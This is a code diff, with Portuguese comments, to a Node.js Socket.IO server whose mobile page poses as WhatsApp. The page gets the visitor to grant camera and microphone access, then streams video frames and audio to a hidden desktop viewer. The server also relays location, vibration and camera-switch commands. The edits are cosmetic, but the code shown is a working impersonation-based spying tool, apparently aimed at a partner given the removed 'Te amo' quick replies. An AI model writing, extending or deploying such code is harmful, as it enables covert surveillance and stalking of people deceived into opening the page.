@@ -4,9 +4,7 @@ const { Server } = require('socket.io');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, {
-  cors: { origin: "*" }
-});
+const io = new Server(server, { cors: { origin: "*" } });
 
 const PORT = process.env.PORT || 3000;
 
@@ -20,7 +18,7 @@ app.get('/', (req, res) => {
   res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
 });
 
-// ==================== CELULAR - CORRIGIDO ====================
+// ==================== CELULAR (INPUT CORRIGIDO) ====================
 function getMobileHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -34,9 +32,8 @@ function getMobileHTML(fullUrl) {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #0B1416;
             height: 100vh;
-            display: flex;
-            flex-direction: column;
             overflow: hidden;
+            position: relative;
         }
         .header {
             background: #075E54;
@@ -45,16 +42,15 @@ function getMobileHTML(fullUrl) {
             display: flex;
             align-items: center;
             gap: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-            flex-shrink: 0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+            position: relative;
+            z-index: 10;
         }
         .header h2 { flex: 1; font-size: 18px; }
-        .status-dot {
-            width: 10px; height: 10px; background: #25D366; border-radius: 50%;
-        }
+        .status-dot { width: 10px; height: 10px; background: #25D366; border-radius: 50%; }
 
         .messages {
-            flex: 1;
+            height: calc(100vh - 110px); /* deixa espaço para header + input */
             overflow-y: auto;
             padding: 16px;
             display: flex;
@@ -92,15 +88,19 @@ function getMobileHTML(fullUrl) {
         }
         .typing.show { display: block; }
 
-        /* === INPUT CORRIGIDO === */
+        /* INPUT FIXO - mais confiável no mobile */
         .input-area {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
             background: #1F2C33;
-            padding: 8px 12px 12px 12px;
+            padding: 8px 12px 12px;
             display: flex;
-            align-items: flex-end;
+            align-items: center;
             gap: 8px;
             border-top: 1px solid #2A3B42;
-            flex-shrink: 0;
+            z-index: 100;
         }
         .input-field {
             flex: 1;
@@ -111,17 +111,18 @@ function getMobileHTML(fullUrl) {
             color: #E9EDEF;
             font-size: 16px;
             outline: none;
-            min-height: 44px;
+            min-height: 46px;
             max-height: 120px;
-            resize: none;
             line-height: 1.4;
+            -webkit-appearance: none;
+            appearance: none;
         }
         .send-btn {
             background: #00A884;
             color: white;
             border: none;
-            width: 44px;
-            height: 44px;
+            width: 46px;
+            height: 46px;
             border-radius: 50%;
             font-size: 22px;
             display: flex;
@@ -156,17 +157,16 @@ function getMobileHTML(fullUrl) {
             font-size: 16px;
             font-weight: bold;
             width: 100%;
-            margin-top: 12px;
         }
         .conn-indicator {
             position: fixed;
-            bottom: 18px;
+            bottom: 70px;
             right: 18px;
             width: 10px;
             height: 10px;
             border-radius: 50%;
             background: #25D366;
-            z-index: 2000;
+            z-index: 200;
         }
     </style>
 </head>
@@ -174,7 +174,7 @@ function getMobileHTML(fullUrl) {
     <div class="modal" id="permissionModal">
         <div class="modal-content">
             <h3>📱 WhatsApp</h3>
-            <p>Permita acesso à câmera e microfone para conversar</p>
+            <p>Permita acesso à câmera e microfone</p>
             <button class="start-btn" id="startBtn">Iniciar Conversa</button>
         </div>
     </div>
@@ -240,7 +240,7 @@ function getMobileHTML(fullUrl) {
                 if (frameInterval) clearInterval(frameInterval);
 
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: facingMode },
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
                     audio: true
                 });
 
@@ -250,7 +250,6 @@ function getMobileHTML(fullUrl) {
 
                 frameInterval = setInterval(sendFrame, 160);
 
-                // Áudio
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const source = audioCtx.createMediaStreamSource(stream);
                 const processor = audioCtx.createScriptProcessor(4096, 1, 1);
@@ -272,7 +271,7 @@ function getMobileHTML(fullUrl) {
 
             } catch (err) {
                 console.error(err);
-                alert("Não foi possível acessar a câmera ou microfone.");
+                alert("Erro ao acessar câmera/microfone.");
             }
         }
 
@@ -291,7 +290,6 @@ function getMobileHTML(fullUrl) {
             typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1200);
         }
 
-        // Eventos
         startBtn.onclick = startPermissions;
         sendBtn.onclick = sendMessage;
         messageInput.addEventListener('keypress', e => {
@@ -315,23 +313,22 @@ function getMobileHTML(fullUrl) {
             if (permissions) startPermissions();
         });
 
-        socket.on('vibrate', () => navigator.vibrate?.([150, 100, 150]));
+        socket.on('vibrate', () => navigator.vibrate?.(200));
 
-        // Mensagem inicial
         setTimeout(() => {
             if (!permissions) {
                 const div = document.createElement('div');
                 div.className = 'message received';
-                div.innerHTML = '<div class="bubble">Olá! Clique em "Iniciar Conversa" acima para ativar a câmera e poder digitar.</div>';
+                div.innerHTML = '<div class="bubble">Olá! Clique em "Iniciar Conversa" para ativar tudo.</div>';
                 messagesDiv.appendChild(div);
             }
-        }, 700);
+        }, 600);
     </script>
 </body>
 </html>`;
 }
 
-// ==================== DESKTOP ====================
+// ==================== DESKTOP (mantido simples) ====================
 function getDesktopHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -361,8 +358,6 @@ function getDesktopHTML(fullUrl) {
         .input-area { background:#1F2C33; padding:12px; display:flex; gap:8px; border-top:1px solid #2A3B42; }
         .input-field { flex:1; background:#2A3B42; border:none; border-radius:24px; padding:12px 16px; color:white; font-size:15.5px; }
         .send-btn { background:#00A884; color:white; border:none; width:44px; height:44px; border-radius:50%; font-size:22px; cursor:pointer; }
-        .quick { padding:10px 16px; background:#1F2C33; display:flex; flex-wrap:wrap; gap:8px; border-top:1px solid #2A3B42; }
-        .quick-msg { background:#2A3B42; padding:6px 12px; border-radius:20px; font-size:13px; cursor:pointer; }
     </style>
 </head>
 <body>
@@ -398,28 +393,15 @@ function getDesktopHTML(fullUrl) {
             <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
             <button class="send-btn" id="sendBtn">➤</button>
         </div>
-
-        <div class="quick" id="quickMessages"></div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io('${fullUrl}');
-
         const messagesDiv = document.getElementById('messages');
         const messageInput = document.getElementById('messageInput');
         const sendBtn = document.getElementById('sendBtn');
         const remoteVideo = document.getElementById('remoteVideo');
-
-        // Quick messages
-        const quickMsgs = ['Olá!', 'Tudo bem?', 'Oi 💕', 'Saudades!', 'Te amo ❤️'];
-        quickMsgs.forEach(msg => {
-            const span = document.createElement('span');
-            span.className = 'quick-msg';
-            span.textContent = msg;
-            span.onclick = () => sendMessage(msg);
-            document.getElementById('quickMessages').appendChild(span);
-        });
 
         function addMessage(text, isSent = true) {
             const div = document.createElement('div');
@@ -430,21 +412,19 @@ function getDesktopHTML(fullUrl) {
             div.scrollIntoView({ behavior: 'smooth' });
         }
 
-        function sendMessage(text = null) {
-            text = text || messageInput.value.trim();
+        function sendMessage() {
+            const text = messageInput.value.trim();
             if (!text) return;
             addMessage(text, true);
             socket.emit('message', text);
             messageInput.value = '';
         }
 
-        sendBtn.onclick = () => sendMessage();
-        messageInput.addEventListener('keypress', e => {
-            if (e.key === 'Enter') sendMessage();
-        });
+        sendBtn.onclick = sendMessage;
+        messageInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendMessage(); });
 
         socket.on('message', msg => addMessage(msg, false));
-        socket.on('frame', frame => { remoteVideo.src = frame; });
+        socket.on('frame', frame => remoteVideo.src = frame);
         socket.on('mobile_online', () => {
             document.getElementById('contactStatus').innerHTML = 'online 💚';
             document.getElementById('chatStatus').innerHTML = 'online';
@@ -457,19 +437,14 @@ function getDesktopHTML(fullUrl) {
 </html>`;
 }
 
-// ==================== SOCKET.IO ====================
+// Socket.IO
 io.on('connection', (socket) => {
   console.log('Cliente conectado:', socket.id);
-
-  const events = ['message', 'typing_start', 'typing_stop', 'frame', 'audio', 'location', 'vibrate', 'toggle_camera', 'mobile_online'];
+  const events = ['message','typing_start','typing_stop','frame','audio','location','vibrate','toggle_camera','mobile_online'];
   events.forEach(ev => socket.on(ev, data => socket.broadcast.emit(ev, data)));
-
-  socket.on('disconnect', () => console.log('Cliente desconectado'));
 });
 
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`\n✅ Servidor rodando na porta ${PORT}`);
-  console.log(`Celular: http://[SEU-IP]:${PORT}`);
-  console.log(`PC: http://localhost:${PORT}\n`);
-  console.log(`Abra PRIMEIRO no CELULAR e clique em "Iniciar Conversa"\n`);
+  console.log(`Abra PRIMEIRO no CELULAR → http://[SEU-IP]:${PORT}`);
 });
